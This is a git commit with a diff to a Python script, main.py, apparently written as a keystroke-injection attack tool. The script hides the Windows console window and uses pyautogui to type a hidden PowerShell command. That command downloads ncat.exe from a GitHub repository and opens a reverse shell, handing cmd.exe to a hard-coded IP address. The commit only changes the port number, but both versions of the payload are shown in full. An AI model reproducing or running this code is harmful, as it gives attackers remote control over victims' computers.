b6c30c5c3f53424f63467f77f26d1a34297776f1
err0rgod <ndgaming458@gmail.com>
2025-06-20 22:58:58 +0530

    fuck off

--- main.py
+++ main.py
@@ -3,6 +3,11 @@ import time
 import subprocess
 import ctypes
 
+
+
+
+
+
 # Step 1: Hide terminal window (Windows only)
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
@@ -17,6 +22,6 @@ pyautogui.press('enter')
 time.sleep(1)
 
 # Step 4: Type the payload
-payload = 'powershell -w Hidden -Command Invoke-WebRequest -Uri https://github.com/err0r-arsenal/netcat/raw/refs/heads/main/ncat.exe -OutFile cat.exe; ./cat.exe 34.131.157.69 4444 -e cmd.exe'
+payload = 'powershell -w Hidden -Command Invoke-WebRequest -Uri https://github.com/err0r-arsenal/netcat/raw/refs/heads/main/ncat.exe -OutFile cat.exe; ./cat.exe 34.131.157.69 4441 -e cmd.exe'
 pyautogui.write(payload, interval=0.005)
 pyautogui.press('enter')
